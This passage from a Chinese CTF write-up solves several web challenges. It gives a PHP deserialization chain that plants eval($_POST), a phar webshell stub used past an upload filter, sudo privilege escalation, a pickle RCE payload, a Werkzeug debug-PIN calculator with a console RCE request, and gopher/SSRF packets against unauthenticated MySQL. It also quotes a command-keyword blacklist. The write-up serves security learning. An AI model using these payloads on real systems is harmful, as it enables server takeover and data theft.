language_">$this</span>-&gt;test2 &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;test1) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;test2)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;沉睡的利刃被你唤醒了，是时候去讨伐魔王了！&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;go;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Dead&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mon3tr</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;到此为止了！魔王&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^cat|flag|tac|system|ls|head|tail|more|less|nl|sort|find?/i&quot;</span>, <span class="variable">$this</span>-&gt;end)) &#123;</span><br><span class="line">            <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="variable">$this</span>-&gt;end);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;难道……要输了吗？&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;结束了？&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ishero = <span class="keyword">new</span> <span class="title class_">Mon3tr</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ishero-&gt;end = <span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HERO=O:5:&quot;Start&quot;:2:&#123;s:6:&quot;ishero&quot;;O:6:&quot;Mon3tr&quot;:1:&#123;s:3:&quot;end&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;s:9:&quot;adventure&quot;;N;&#125;&amp;1=system(&quot;cat /f*&quot;);</span><br></pre></td></tr></table></figure>



<h2 id="Week4-来getshell-速度"><a href="#Week4-来getshell-速度" class="headerlink" title="[Week4] 来getshell 速度!"></a>[Week4] 来getshell 速度!</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$allowed_extensions</span> = [<span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;gz&#x27;</span>, <span class="string">&#x27;xz&#x27;</span>, <span class="string">&#x27;7z&#x27;</span>];</span><br><span class="line"><span class="variable">$allowed_mime_types</span> = [</span><br><span class="line">    <span class="string">&#x27;application/zip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-bzip2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-xz&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;application/x-7z-compressed&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$tempfile</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tempfile</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;__HALT_COMPILER();&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;PK&quot;</span>) !== <span class="literal">false</span> ||</span><br><span class="line">        <span class="title function_ invoke__">stripos</span>(<span class="variable">$data</span>, <span class="string">&quot;&lt;?&quot;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$data</span>), <span class="string">&quot;&lt;?php&quot;</span>) !== <span class="literal">false</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Nope :&lt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// mimetype check</span></span><br><span class="line">        <span class="variable">$finfo</span> = <span class="title function_ invoke__">finfo_open</span>(FILEINFO_MIME_TYPE);</span><br><span class="line">        <span class="variable">$mime_type</span> = <span class="title function_ invoke__">finfo_file</span>(<span class="variable">$finfo</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">finfo_close</span>(<span class="variable">$finfo</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$mime_type</span>, <span class="variable">$allowed_mime_types</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;unexpected mimetype&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ext check</span></span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]), PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="variable">$allowed_extensions</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;unexpected extension&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&quot;/tmp/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;File upload success!Please include with &#x27;url&#x27;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="variable">$include_url</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.(zip|bz2|gz|xz|7z)/i&quot;</span>, <span class="variable">$include_url</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;unexpected extension&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;/tmp/&#x27;</span> . <span class="variable">$include_url</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form enctype=<span class="string">&#x27;multipart/form-data&#x27;</span> method=<span class="string">&#x27;post&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&#x27;file&#x27;</span> name=<span class="string">&#x27;file&#x27;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;upload&quot;</span>&gt;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>一眼include的无php代码包含RCE特性</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;exploit.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$stub</span> = <span class="string">&lt;&lt;&lt;&#x27;STUB&#x27;</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    eval($_POST[9]);</span></span><br><span class="line"><span class="string">    __HALT_COMPILER();</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">STUB</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="variable">$stub</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>gzip压缩后上传</p>
<p>没有权限读flag，接着提权</p>
<p>信息收集发现<code>/etc/sudoers</code>能读，在里面发现这个配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data     asd.asd.asd  = NOPASSWD:ALL</span><br></pre></td></tr></table></figure>

<p>可以使用<code>sudo</code>提权读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -h asd.asd.asd cat /flag</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251028204500021.png" alt="image-20251028204500021"></p>
<h2 id="Week4-这又又是什么函数"><a href="#Week4-这又又是什么函数" class="headerlink" title="[Week4] 这又又是什么函数"></a>[Week4] 这又又是什么函数</h2><p>访问<code>/src</code>得到源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">PICKLE_BLACKLIST = [</span><br><span class="line">    <span class="string">b&#x27;eval&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;os&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;x80&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;before&#x27;</span>,</span><br><span class="line">    <span class="string">b&#x27;after&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/deser&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deser</span>():</span><br><span class="line">    a = request.form.get(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        decoded_data = base64.b64decode(a)</span><br><span class="line">        <span class="built_in">print</span>(decoded_data)</span><br><span class="line">    <span class="keyword">except</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> forbidden <span class="keyword">in</span> PICKLE_BLACKLIST:</span><br><span class="line">        <span class="keyword">if</span> forbidden <span class="keyword">in</span> decoded_data:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;waf&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = pickle.loads(decoded_data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;done&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fail&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>简单的pickle反序列化</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        cmd = <span class="string">b&quot;__import__(&#x27;os&#x27;).system(&#x27;mkdir static;cat /flag&gt;static/1.txt&#x27;)&quot;</span></span><br><span class="line">        cmd = base64.b64encode(cmd).decode()</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">exec</span>, (<span class="string">f&quot;exec(__import__(&#x27;base64&#x27;).b64decode(&#x27;<span class="subst">&#123;cmd&#125;</span>&#x27;))&quot;</span>,))</span><br><span class="line">    </span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br><span class="line"><span class="comment"># b&#x27;Y19fYnVpbHRpbl9fCmV4ZWMKcQAoWHwAAABleGVjKF9faW1wb3J0X18oJ2Jhc2U2NCcpLmI2NGRlY29kZSgnWDE5cGJYQnZjblJmWHlnbmIzTW5LUzV6ZVhOMFpXMG9KMjFyWkdseUlITjBZWFJwWXp0allYUWdMMlpzWVdjK2MzUmhkR2xqTHpFdWRIaDBKeWs9JykpcQF0cQJScQMu&#x27;</span></span><br></pre></td></tr></table></figure>

<p>发送过去后，访问<code>/static/1.txt</code>得到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251027004101790.png" alt="image-20251027004101790"></p>
<h2 id="Week4-好像什么都能读"><a href="#Week4-好像什么都能读" class="headerlink" title="[Week4] 好像什么都能读"></a>[Week4] 好像什么都能读</h2><p>flask开启了debug，可以算pin码来RCE</p>
<p>读以下文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/sys/class/net/eth0/address</span><br><span class="line">/proc/sys/kernel/random/boot_id</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>算pin码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span><span class="comment"># /etc/passwd</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># 默认值</span></span><br><span class="line">    <span class="string">&#x27;/home/ctf/.local/lib/python3.13/site-packages/flask/app.py&#x27;</span> <span class="comment"># 报错得到</span></span><br><span class="line">]</span><br><span class="line"><span class="comment"># e26daef91fc8</span></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&quot;1a:e7:67:ad:22:95&quot;</span>.replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;&#x27;</span>),<span class="number">16</span>)),<span class="comment">#  /sys/class/net/eth0/address 16进制转10进制</span></span><br><span class="line">    <span class="comment">#machine_id由三个合并(docker就后两个)：1./etc/machine-id 2./proc/sys/kernel/random/boot_id  8cab9c97-85be-4fb4-9d17-29335d7b2b8a 3./proc/self/cgroup  042c06141b08a0dd69b3c7c3aa8a8044524367951b6ff4ec81093448dcf11c04</span></span><br><span class="line">    <span class="string">&#x27;89b34b88-6f33-4c4b-8a30-69a4ba41fd0e&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"><span class="built_in">print</span>(cookie_name)</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="comment"># 算出pin码</span></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="comment"># 算出cookie</span></span><br><span class="line">cookie=<span class="string">f&quot;<span class="subst">&#123;cookie_name&#125;</span>=<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span></span><br><span class="line"><span class="built_in">print</span>(cookie)</span><br><span class="line"><span class="comment"># 138-062-430</span></span><br><span class="line"><span class="comment"># __wzdad4fc3444504267ea752=1761497594|33c8c882f1c1</span></span><br></pre></td></tr></table></figure>

<p>接着去<code>/console</code>路由，需要抓包，然后将<code>host</code>改成<code>127.0.0.1</code></p>
<p>将算出来的Cookie替换一下即可</p>
<p>RCE</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /console?__debugger__=yes&amp;cmd=__import__%28%27os%27%29.popen%28%27cat+%2Ff*%27%29.read%28%29&amp;frm=0&amp;s=CVkwficJvGysRxRnVXKz HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: */*</span><br><span class="line">Referer: http://challenge.ilovectf.cn:30062/console</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: __wzdad4fc3444504267ea752=1761497483|33c8c882f1c1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251027005334682.png" alt="image-20251027005334682"></p>
<h2 id="Week4-android-or-apple"><a href="#Week4-android-or-apple" class="headerlink" title="[Week4] android or apple"></a>[Week4] android or apple</h2><p>代码审计，可以发现这里存在SSRF</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-VERIFY-CODE-URL: http://127.0.0.1/</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029170634110.png" alt="image-20251029170634110"></p>
<p>接着探测端口，发现<code>3306</code>端口开了无密码的mysql，可以未授权执行sql语句</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029170749419.png" alt="image-20251029170749419"></p>
<p>用<code>gopherus.py</code>构造SSRF的请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure>

<p>接着执行sql语句查看库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br><span class="line"></span><br><span class="line">X-VERIFY-CODE-URL: ftp://127.0.0.1:3306/%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">information_schema</span><br><span class="line">ctf_db</span><br><span class="line">mysql</span><br><span class="line">performance_schema</span><br><span class="line">sys</span><br></pre></td></tr></table></figure>

<p>接着查<code>ctf_db</code>库的表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use ctf_db;show tables;</span><br><span class="line"></span><br><span class="line">ftp://127.0.0.1:3306/%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%75%73%65%20%63%74%66%5f%64%62%3b%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<p>得到<code>flags</code>表</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week3&week4_WP/image-20251029171531976.png" alt="image-20251029171531976"></p>
<p>接着查<code>flags</code>表内的数据，得到flag</p>
